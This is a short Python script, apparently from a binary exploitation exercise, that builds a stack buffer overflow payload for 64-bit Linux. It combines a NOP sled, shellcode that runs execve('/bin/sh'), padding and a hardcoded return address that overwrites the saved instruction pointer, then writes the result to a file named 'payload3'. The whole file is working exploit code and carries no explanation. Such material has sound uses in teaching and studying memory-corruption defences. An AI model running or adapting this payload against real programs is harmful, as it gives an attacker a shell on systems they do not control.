#!/usr/bin/env python3
from struct import pack

payload_length = 104
nop_length = 48

# Full 8-byte return address â€” example: 0x7fffffffddb0
return_address = pack("<Q", 0x7fffffffdd34)  # adjust as needed

# NOP sled
nop_slide = b"\x90" * nop_length

# Shellcode to execve /bin/sh (Linux x86_64)
shellcode = (
    b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
    b"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    b"\x3b\x0f\x05"
)

# Fill the rest with 'B's to align RIP overwrite
padding = b'B' * (payload_length - len(nop_slide) - len(shellcode))

# Construct final payload
payload = nop_slide + shellcode + padding + return_address

# Write to file in binary mode!
with open("payload3", "wb") as f:
    f.write(payload)
